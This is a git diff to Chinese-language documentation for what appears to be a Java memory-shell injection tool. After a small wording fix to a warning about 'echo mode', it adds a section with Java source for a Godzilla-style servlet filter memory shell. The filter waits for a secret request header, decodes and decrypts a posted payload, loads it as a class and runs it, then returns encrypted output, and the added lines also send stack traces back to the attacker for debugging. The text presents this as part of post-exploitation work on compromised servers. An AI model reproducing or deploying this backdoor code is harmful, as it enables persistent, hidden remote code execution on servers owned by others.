@@ -127,7 +127,7 @@ Logger.info(msg) // (java.util)
 ### 回显模式
 
 <Callout title="注意" type="warn">
-  并不是所有服务都支持回显马，因此在不支持的服务开启回显模式，也享受不到回显效果
+  并不是所有服务都支持回显马，因此在不支持的服务即使开启回显模式，也享受不到回显效果
 </Callout>
 
 调试模式仅限于我们能访问到业务日志，但是实战过程中，在没 getshell 前我们获取不到服务器权限，并且调试模式在目标业务打印大段注入信息属实敏感，因此有了回显模式。
@@ -139,6 +139,59 @@ Logger.info(msg) // (java.util)
 <Callout title="额外注意" type="warn">
   由于回显马需要从当前线程获取 request 和 response 对象，因此跨线程 RCE 的环境下，无法回显，根据代码执行顺序，无法回显的环境，开启回显模式之后注入器也不会进行注入动作，因此支持回显马但无法回显的环境，请一定不要开启回显模式。
 </Callout>
+
+在确认了内存马注入成功后，如果发现连不上，我们需要调整我们的内存马，将错误信息带出，方便排查，内置的 Godzilla 已经默认支持了。
+
+```java
+@Override
+public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
+    HttpServletRequest request = (HttpServletRequest) servletRequest;
+    HttpServletResponse response = (HttpServletResponse) servletResponse;
+    try {
+        if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
+            PrintWriter writer = response.getWriter();
+            try {
+                byte[] data = base64Decode(request.getParameter(pass));
+                data = this.x(data, false);
+                if (payload == null) {
+                    payload = new GodzillaFilter(Thread.currentThread().getContextClassLoader()).Q(data);
+                } else {
+                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                    Object f = payload.newInstance();
+                    f.equals(arrOut);
+                    f.equals(request);
+                    f.equals(data);
+                    f.toString();
+                    writer.write(md5.substring(0, 16));
+                    writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
+                    writer.write(md5.substring(16));
+                }
+            } catch (Throwable e) {
+                e.printStackTrace();
+                writer.write(getErrorMessage(e)); // [!code ++]
+            }
+            return;
+        }
+    } catch (Throwable e) {
+        e.printStackTrace();
+    }
+    chain.doFilter(servletRequest, servletResponse);
+}
+
+private String getErrorMessage(Throwable throwable) { // [!code ++]
+    PrintStream printStream = null; // [!code ++]
+    try { // [!code ++]
+        ByteArrayOutputStream outputStream = new ByteArrayOutputStream(); // [!code ++]
+        printStream = new PrintStream(outputStream); // [!code ++]
+        throwable.printStackTrace(printStream); // [!code ++]
+        return outputStream.toString(); // [!code ++]
+    } finally { // [!code ++]
+        if (printStream != null) { // [!code ++]
+            printStream.close(); // [!code ++]
+        } // [!code ++]
+    } // [!code ++]
+} // [!code ++]
+```
 
 
 ### 绕过模块限制
